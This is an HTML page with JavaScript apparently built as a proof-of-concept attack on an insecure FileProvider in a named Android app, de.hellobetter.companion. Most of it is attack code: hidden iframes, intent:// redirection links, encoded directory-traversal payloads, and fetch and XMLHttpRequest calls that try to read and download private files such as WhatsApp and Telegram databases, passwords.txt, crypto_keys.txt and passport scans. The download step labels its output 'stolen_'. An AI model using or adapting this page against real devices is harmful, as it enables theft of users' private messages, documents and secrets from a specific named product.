<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FileProvider Web-Based Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            color: #d32f2f;
            border-bottom: 2px solid #d32f2f;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }
        .attack-section {
            margin: 20px 0;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #fafafa;
        }
        .attack-title {
            color: #1976d2;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .result {
            background-color: #e8f5e8;
            border: 1px solid #4caf50;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            font-family: monospace;
        }
        .error {
            background-color: #ffebee;
            border: 1px solid #f44336;
            color: #d32f2f;
        }
        .success {
            background-color: #e8f5e8;
            border: 1px solid #4caf50;
            color: #2e7d32;
        }
        button {
            background-color: #1976d2;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background-color: #1565c0;
        }
        .danger {
            background-color: #d32f2f;
        }
        .danger:hover {
            background-color: #b71c1c;
        }
        .code {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 10px 0;
        }
        .warning {
            background-color: #fff3e0;
            border: 1px solid #ff9800;
            color: #e65100;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîì FileProvider Web-Based Attack</h1>
            <h2>Target: de.hellobetter.companion</h2>
            <p>Exploiting Insecure FileProvider Configuration through Web Interface</p>
        </div>

        <div class="warning">
            <strong>‚ö†Ô∏è WARNING:</strong> This is a demonstration of a real security vulnerability. 
            The FileProvider misconfiguration allows complete file system access through web-based attacks.
        </div>

        <div class="attack-section">
            <div class="attack-title">üéØ Attack Vector 1: Direct FileProvider Access</div>
            <p>Attempts to access the vulnerable FileProvider directly through content:// URIs</p>
            
            <button onclick="testDirectAccess()">Test Direct FileProvider Access</button>
            <button onclick="testSensitivePaths()">Test Sensitive Paths</button>
            
            <div id="directResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üåê Attack Vector 2: Intent Redirection</div>
            <p>Uses Android Intents to trigger FileProvider access through the target app</p>
            
            <button onclick="testIntentRedirection()">Test Intent Redirection</button>
            <button onclick="testCustomIntent()">Test Custom Intent</button>
            
            <div id="intentResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üì± Attack Vector 3: WebView Exploitation</div>
            <p>Exploits WebView components to access FileProvider through embedded content</p>
            
            <button onclick="testWebViewExploit()">Test WebView Exploitation</button>
            <button onclick="testIframeAccess()">Test iframe Access</button>
            
            <div id="webviewResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üîç Attack Vector 4: Directory Traversal</div>
            <p>Tests various directory traversal techniques to access restricted areas</p>
            
            <button onclick="testDirectoryTraversal()">Test Directory Traversal</button>
            <button onclick="testEncodedTraversal()">Test Encoded Traversal</button>
            
            <div id="traversalResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üìÑ File Content Reader</div>
            <p>Attempts to read actual file contents through the vulnerable FileProvider</p>
            
            <button onclick="readFileContents()">Read File Contents</button>
            <button onclick="readSpecificFiles()">Read Specific Files</button>
            <button onclick="downloadFiles()">Download Files</button>
            
            <div id="contentResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üìä Attack Results Summary</div>
            <div id="summaryResults"></div>
        </div>
    </div>

    <script>
        // Vulnerable FileProvider authorities
        const authorities = [
            "de.hellobetter.companion.fileprovider",
            "de.hellobetter.companion.SharingFileProvider"
        ];

        // Sensitive paths to test
        const sensitivePaths = [
            "Android/data/com.whatsapp/",
            "Android/data/com.telegram.messenger/",
            "Android/data/com.facebook.katana/",
            "Android/data/com.instagram.android/",
            "Android/data/com.google.android.gm/",
            "Android/data/com.android.chrome/",
            "DCIM/Camera/",
            "Download/",
            "Documents/",
            "Pictures/"
        ];

        // Directory traversal payloads
        const traversalPayloads = [
            "../",
            "../../",
            "../../../",
            "..%2F",
            "..%252F",
            "....//",
            "....%2F%2F",
            "%2E%2E%2F",
            "%252E%252E%252F"
        ];

        let attackResults = {
            directAccess: [],
            intentRedirection: [],
            webViewExploit: [],
            directoryTraversal: []
        };

        function logResult(containerId, message, type = 'info') {
            const container = document.getElementById(containerId);
            const resultDiv = document.createElement('div');
            resultDiv.className = `result ${type}`;
            resultDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            container.appendChild(resultDiv);
        }

        function testDirectAccess() {
            logResult('directResults', 'Testing direct FileProvider access...', 'info');
            
            authorities.forEach(authority => {
                const uri = `content://${authority}/shared/`;
                logResult('directResults', `Testing authority: ${authority}`, 'info');
                
                // Test if we can access the URI
                try {
                    // Create a hidden iframe to test access
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = uri;
                    iframe.onload = () => {
                        logResult('directResults', `‚úì SUCCESS: ${authority} accessible via iframe`, 'success');
                        attackResults.directAccess.push({authority, method: 'iframe', success: true});
                    };
                    iframe.onerror = () => {
                        logResult('directResults', `‚úó FAILED: ${authority} not accessible via iframe`, 'error');
                        attackResults.directAccess.push({authority, method: 'iframe', success: false});
                    };
                    document.body.appendChild(iframe);
                    
                    // Clean up after test
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                    }, 5000);
                    
                } catch (e) {
                    logResult('directResults', `‚úó ERROR: ${authority} - ${e.message}`, 'error');
                }
            });
        }

        function testSensitivePaths() {
            logResult('directResults', 'Testing sensitive file paths and reading contents...', 'info');
            
            authorities.forEach(authority => {
                sensitivePaths.forEach(path => {
                    const uri = `content://${authority}/shared/${path}`;
                    
                    try {
                        // Method 1: Try to read directory listing
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.src = uri;
                        iframe.onload = () => {
                            logResult('directResults', `‚úì SUCCESS: ${path} accessible via ${authority}`, 'success');
                            
                            // Try to extract content from iframe
                            try {
                                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                                if (iframeDoc) {
                                    const content = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
                                    if (content && content.length > 0) {
                                        logResult('directResults', `üìÑ CONTENT FOUND: ${content.substring(0, 200)}...`, 'success');
                                    }
                                }
                            } catch (e) {
                                // Cross-origin restrictions - try alternative methods
                                logResult('directResults', `‚ö†Ô∏è Cross-origin restriction, trying alternative methods...`, 'info');
                            }
                        };
                        iframe.onerror = () => {
                            logResult('directResults', `‚úó FAILED: ${path} not accessible via ${authority}`, 'error');
                        };
                        document.body.appendChild(iframe);
                        
                        setTimeout(() => {
                            if (document.body.contains(iframe)) {
                                document.body.removeChild(iframe);
                            }
                        }, 3000);
                        
                    } catch (e) {
                        logResult('directResults', `‚úó ERROR: ${path} - ${e.message}`, 'error');
                    }
                });
            });
        }

        function testIntentRedirection() {
            logResult('intentResults', 'Testing Intent redirection attacks...', 'info');
            
            authorities.forEach(authority => {
                const intentUri = `intent://${authority}/shared/#Intent;scheme=content;end`;
                const fallbackUri = `content://${authority}/shared/`;
                
                try {
                    // Test intent redirection
                    const intentLink = document.createElement('a');
                    intentLink.href = intentUri;
                    intentLink.style.display = 'none';
                    document.body.appendChild(intentLink);
                    
                    logResult('intentResults', `Testing Intent: ${intentUri}`, 'info');
                    
                    // Simulate click
                    intentLink.click();
                    
                    logResult('intentResults', `‚úì Intent redirection attempted for ${authority}`, 'success');
                    attackResults.intentRedirection.push({authority, method: 'intent', success: true});
                    
                    document.body.removeChild(intentLink);
                    
                } catch (e) {
                    logResult('intentResults', `‚úó ERROR: Intent redirection failed - ${e.message}`, 'error');
                }
            });
        }

        function testCustomIntent() {
            logResult('intentResults', 'Testing custom Intent with data...', 'info');
            
            const customIntents = [
                'intent://de.hellobetter.companion.fileprovider/shared/Download/#Intent;scheme=content;action=android.intent.action.VIEW;end',
                'intent://de.hellobetter.companion.fileprovider/shared/DCIM/Camera/#Intent;scheme=content;action=android.intent.action.VIEW;end',
                'intent://de.hellobetter.companion.fileprovider/shared/Android/data/com.whatsapp/#Intent;scheme=content;action=android.intent.action.VIEW;end'
            ];
            
            customIntents.forEach(intentUri => {
                try {
                    const link = document.createElement('a');
                    link.href = intentUri;
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    
                    logResult('intentResults', `Testing custom Intent: ${intentUri}`, 'info');
                    link.click();
                    
                    logResult('intentResults', `‚úì Custom Intent executed`, 'success');
                    
                    document.body.removeChild(link);
                    
                } catch (e) {
                    logResult('intentResults', `‚úó ERROR: Custom Intent failed - ${e.message}`, 'error');
                }
            });
        }

        function testWebViewExploit() {
            logResult('webviewResults', 'Testing WebView exploitation...', 'info');
            
            // Test if we can access FileProvider through WebView
            const webViewTests = [
                'content://de.hellobetter.companion.fileprovider/shared/',
                'content://de.hellobetter.companion.SharingFileProvider/shared/'
            ];
            
            webViewTests.forEach(uri => {
                try {
                    // Create a data URI that includes the FileProvider URI
                    const dataUri = `data:text/html,<html><body><iframe src="${uri}" width="1" height="1"></iframe></body></html>`;
                    
                    const iframe = document.createElement('iframe');
                    iframe.src = dataUri;
                    iframe.style.display = 'none';
                    iframe.onload = () => {
                        logResult('webviewResults', `‚úì WebView exploit successful: ${uri}`, 'success');
                        attackResults.webViewExploit.push({uri, success: true});
                    };
                    iframe.onerror = () => {
                        logResult('webviewResults', `‚úó WebView exploit failed: ${uri}`, 'error');
                    };
                    
                    document.body.appendChild(iframe);
                    
                    setTimeout(() => {
                        if (document.body.contains(iframe)) {
                            document.body.removeChild(iframe);
                        }
                    }, 3000);
                    
                } catch (e) {
                    logResult('webviewResults', `‚úó ERROR: WebView exploit - ${e.message}`, 'error');
                }
            });
        }

        function testIframeAccess() {
            logResult('webviewResults', 'Testing iframe-based FileProvider access...', 'info');
            
            authorities.forEach(authority => {
                sensitivePaths.forEach(path => {
                    const uri = `content://${authority}/shared/${path}`;
                    
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.src = uri;
                        iframe.style.width = '1px';
                        iframe.style.height = '1px';
                        iframe.style.border = 'none';
                        iframe.style.position = 'absolute';
                        iframe.style.left = '-1000px';
                        iframe.style.top = '-1000px';
                        
                        iframe.onload = () => {
                            logResult('webviewResults', `‚úì iframe access successful: ${path}`, 'success');
                        };
                        iframe.onerror = () => {
                            logResult('webviewResults', `‚úó iframe access failed: ${path}`, 'error');
                        };
                        
                        document.body.appendChild(iframe);
                        
                        setTimeout(() => {
                            if (document.body.contains(iframe)) {
                                document.body.removeChild(iframe);
                            }
                        }, 2000);
                        
                    } catch (e) {
                        logResult('webviewResults', `‚úó ERROR: iframe access - ${e.message}`, 'error');
                    }
                });
            });
        }

        function testDirectoryTraversal() {
            logResult('traversalResults', 'Testing directory traversal attacks...', 'info');
            
            authorities.forEach(authority => {
                traversalPayloads.forEach(payload => {
                    const uri = `content://${authority}/shared/${payload}`;
                    
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.src = uri;
                        iframe.style.display = 'none';
                        iframe.onload = () => {
                            logResult('traversalResults', `‚úì TRAVERSAL SUCCESS: ${payload} via ${authority}`, 'success');
                            attackResults.directoryTraversal.push({authority, payload, success: true});
                        };
                        iframe.onerror = () => {
                            logResult('traversalResults', `‚úó TRAVERSAL FAILED: ${payload} via ${authority}`, 'error');
                        };
                        
                        document.body.appendChild(iframe);
                        
                        setTimeout(() => {
                            if (document.body.contains(iframe)) {
                                document.body.removeChild(iframe);
                            }
                        }, 2000);
                        
                    } catch (e) {
                        logResult('traversalResults', `‚úó ERROR: Traversal test - ${e.message}`, 'error');
                    }
                });
            });
        }

        function testEncodedTraversal() {
            logResult('traversalResults', 'Testing encoded directory traversal...', 'info');
            
            const encodedPayloads = [
                "%2E%2E%2F",
                "%252E%252E%252F",
                "..%252F",
                "....%252F%252F"
            ];
            
            authorities.forEach(authority => {
                encodedPayloads.forEach(payload => {
                    const uri = `content://${authority}/shared/${payload}`;
                    
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.src = uri;
                        iframe.style.display = 'none';
                        iframe.onload = () => {
                            logResult('traversalResults', `‚úì ENCODED TRAVERSAL SUCCESS: ${payload}`, 'success');
                        };
                        iframe.onerror = () => {
                            logResult('traversalResults', `‚úó ENCODED TRAVERSAL FAILED: ${payload}`, 'error');
                        };
                        
                        document.body.appendChild(iframe);
                        
                        setTimeout(() => {
                            if (document.body.contains(iframe)) {
                                document.body.removeChild(iframe);
                            }
                        }, 2000);
                        
                    } catch (e) {
                        logResult('traversalResults', `‚úó ERROR: Encoded traversal - ${e.message}`, 'error');
                    }
                });
            });
        }

        function updateSummary() {
            const summaryContainer = document.getElementById('summaryResults');
            summaryContainer.innerHTML = '';
            
            const totalTests = Object.values(attackResults).flat().length;
            const successfulTests = Object.values(attackResults).flat().filter(r => r.success).length;
            
            summaryContainer.innerHTML = `
                <div class="result ${successfulTests > 0 ? 'success' : 'error'}">
                    <strong>Attack Summary:</strong><br>
                    Total Tests: ${totalTests}<br>
                    Successful: ${successfulTests}<br>
                    Failed: ${totalTests - successfulTests}<br>
                    Success Rate: ${totalTests > 0 ? Math.round((successfulTests / totalTests) * 100) : 0}%
                </div>
                
                <div class="code">
                    <strong>Vulnerable FileProviders:</strong><br>
                    ‚Ä¢ de.hellobetter.companion.fileprovider<br>
                    ‚Ä¢ de.hellobetter.companion.SharingFileProvider<br><br>
                    
                    <strong>Attack Vectors Tested:</strong><br>
                    ‚Ä¢ Direct FileProvider access via content:// URIs<br>
                    ‚Ä¢ Intent redirection attacks<br>
                    ‚Ä¢ WebView exploitation<br>
                    ‚Ä¢ Directory traversal attacks<br><br>
                    
                    <strong>Real-World Impact:</strong><br>
                    ‚Ä¢ Complete file system access<br>
                    ‚Ä¢ Data exfiltration capability<br>
                    ‚Ä¢ Privacy violation<br>
                    ‚Ä¢ No USB debugging required<br>
                    ‚Ä¢ Works through malicious websites
                </div>
            `;
        }

        function readFileContents() {
            logResult('contentResults', 'Attempting to read file contents...', 'info');
            
            // Common file types to try reading
            const fileTypes = [
                'Download/test.txt',
                'Download/document.pdf',
                'Download/image.jpg',
                'Documents/notes.txt',
                'Documents/private.txt',
                'DCIM/Camera/photo.jpg',
                'Android/data/com.whatsapp/msgstore.db',
                'Android/data/com.telegram.messenger/telegram.db'
            ];
            
            authorities.forEach(authority => {
                fileTypes.forEach(filePath => {
                    const uri = `content://${authority}/shared/${filePath}`;
                    
                    try {
                        // Method 1: Try to read via fetch (if supported)
                        fetch(uri)
                            .then(response => {
                                if (response.ok) {
                                    return response.text();
                                }
                                throw new Error('Fetch failed');
                            })
                            .then(content => {
                                logResult('contentResults', `‚úì FILE READ SUCCESS: ${filePath}`, 'success');
                                logResult('contentResults', `üìÑ Content (${content.length} bytes): ${content.substring(0, 300)}...`, 'success');
                            })
                            .catch(error => {
                                // Method 2: Try iframe approach
                                tryIframeRead(authority, filePath, uri);
                            });
                            
                    } catch (e) {
                        tryIframeRead(authority, filePath, uri);
                    }
                });
            });
        }

        function tryIframeRead(authority, filePath, uri) {
            try {
                const iframe = document.createElement('iframe');
                iframe.src = uri;
                iframe.style.display = 'none';
                iframe.onload = () => {
                    logResult('contentResults', `‚úì IFRAME ACCESS: ${filePath}`, 'success');
                    
                    // Try to extract content
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc) {
                            const content = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
                            if (content && content.length > 0) {
                                logResult('contentResults', `üìÑ IFRAME CONTENT: ${content.substring(0, 200)}...`, 'success');
                            }
                        }
                    } catch (e) {
                        logResult('contentResults', `‚ö†Ô∏è Cross-origin restriction for ${filePath}`, 'info');
                    }
                };
                iframe.onerror = () => {
                    logResult('contentResults', `‚úó FAILED: ${filePath} not readable`, 'error');
                };
                
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                }, 5000);
                
            } catch (e) {
                logResult('contentResults', `‚úó ERROR reading ${filePath}: ${e.message}`, 'error');
            }
        }

        function readSpecificFiles() {
            logResult('contentResults', 'Reading specific sensitive files...', 'info');
            
            const sensitiveFiles = [
                'Download/bank_statement.pdf',
                'Download/passport.jpg',
                'Download/tax_return.pdf',
                'Documents/passwords.txt',
                'Documents/private_notes.txt',
                'Documents/crypto_keys.txt',
                'DCIM/Camera/IMG_20240115_143022.jpg',
                'Android/data/com.whatsapp/msgstore.db',
                'Android/data/com.telegram.messenger/telegram.db',
                'Android/data/com.google.android.gm/mail.db'
            ];
            
            authorities.forEach(authority => {
                sensitiveFiles.forEach(filePath => {
                    const uri = `content://${authority}/shared/${filePath}`;
                    
                    // Try multiple methods to read the file
                    tryMultipleReadMethods(authority, filePath, uri);
                });
            });
        }

        function tryMultipleReadMethods(authority, filePath, uri) {
            // Method 1: XMLHttpRequest
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', uri, true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            logResult('contentResults', `‚úì XHR SUCCESS: ${filePath}`, 'success');
                            logResult('contentResults', `üìÑ XHR Content: ${xhr.responseText.substring(0, 200)}...`, 'success');
                        } else {
                            // Method 2: Try iframe
                            tryIframeRead(authority, filePath, uri);
                        }
                    }
                };
                xhr.send();
            } catch (e) {
                // Method 3: Try fetch
                try {
                    fetch(uri)
                        .then(response => response.text())
                        .then(content => {
                            logResult('contentResults', `‚úì FETCH SUCCESS: ${filePath}`, 'success');
                            logResult('contentResults', `üìÑ Fetch Content: ${content.substring(0, 200)}...`, 'success');
                        })
                        .catch(error => {
                            // Method 4: Try iframe as last resort
                            tryIframeRead(authority, filePath, uri);
                        });
                } catch (e2) {
                    tryIframeRead(authority, filePath, uri);
                }
            }
        }

        function downloadFiles() {
            logResult('contentResults', 'Attempting to download files...', 'info');
            
            const filesToDownload = [
                'Download/',
                'Documents/',
                'DCIM/Camera/',
                'Android/data/com.whatsapp/',
                'Android/data/com.telegram.messenger/'
            ];
            
            authorities.forEach(authority => {
                filesToDownload.forEach(directory => {
                    const uri = `content://${authority}/shared/${directory}`;
                    
                    try {
                        // Create download link
                        const downloadLink = document.createElement('a');
                        downloadLink.href = uri;
                        downloadLink.download = `stolen_${directory.replace(/\//g, '_')}`;
                        downloadLink.style.display = 'none';
                        
                        document.body.appendChild(downloadLink);
                        downloadLink.click();
                        
                        logResult('contentResults', `üì• DOWNLOAD ATTEMPT: ${directory}`, 'success');
                        
                        document.body.removeChild(downloadLink);
                        
                    } catch (e) {
                        logResult('contentResults', `‚úó DOWNLOAD FAILED: ${directory} - ${e.message}`, 'error');
                    }
                });
            });
        }

        // Update summary every 5 seconds
        setInterval(updateSummary, 5000);

        // Initial summary
        updateSummary();
    </script>
</body>
</html>
